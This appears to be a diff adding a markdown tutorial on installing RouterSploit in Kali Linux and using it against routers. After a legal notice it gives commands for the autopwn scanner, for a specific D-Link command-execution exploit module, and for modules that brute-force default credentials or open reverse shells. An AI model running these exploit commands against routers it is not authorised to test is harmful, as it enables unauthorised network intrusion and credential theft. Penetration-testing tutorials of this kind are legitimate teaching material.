@@ -1,0 +1,101 @@
+⚠️ LEGAL NOTICE
+This is for ethical hacking and educational use only. Only test devices you own or have explicit permission to audit. Unauthorized access is illegal.
+
+🔧 Step-by-Step: How to Use RouterSploit in Kali Linux
+✅ 1. Install RouterSploit
+RouterSploit is not pre-installed in Kali by default. To install:
+
+bash
+Copy
+Edit
+sudo apt update
+sudo apt install git python3-pip
+git clone https://github.com/threat9/routersploit
+cd routersploit
+pip3 install -r requirements.txt
+▶️ 2. Run RouterSploit
+bash
+Copy
+Edit
+sudo python3 rsf.py
+This opens the RouterSploit interactive shell:
+
+nginx
+Copy
+Edit
+rsf >
+🛠️ 3. Use the Scanner Module
+To scan for routers and their vulnerabilities:
+
+bash
+Copy
+Edit
+rsf > use scanners/autopwn
+rsf (Autopwn) > set target [IP_ADDRESS]
+rsf (Autopwn) > run
+Example:
+
+bash
+Copy
+Edit
+set target 192.168.1.1
+This will automatically run all known router exploits against the IP.
+
+🔍 4. Manual Exploit Selection
+You can browse specific exploit modules:
+
+bash
+Copy
+Edit
+rsf > show modules
+Then choose a module:
+
+bash
+Copy
+Edit
+use exploits/routers/dlink/dlink_dir_300_320_dir_600_exec
+set target 192.168.1.1
+run
+📜 5. Set Target IP and Run Exploit
+Inside the module:
+
+bash
+Copy
+Edit
+set target 192.168.1.1
+run
+If the exploit is successful, you'll get a reverse shell or credentials.
+
+🧠 6. Other Useful Modules
+scanners/autopwn — Auto scans and exploits
+
+creds/routers — Router default creds brute force
+
+payloads — Reverse shells or bind shells
+
+exploits/routers/ — Specific router brand vulnerabilities
+
+🧪 Example Full Command Flow
+bash
+Copy
+Edit
+cd routersploit
+sudo python3 rsf.py
+use scanners/autopwn
+set target 192.168.0.1
+run
+📌 Tip: Update RouterSploit Regularly
+bash
+Copy
+Edit
+cd routersploit
+git pull
+🧰 Bonus: Test with Local Router
+You can test RouterSploit safely by:
+
+Connecting to your home router via LAN or Wi-Fi
+
+Finding its IP (ip a or ifconfig)
+
+Running RouterSploit against it
+
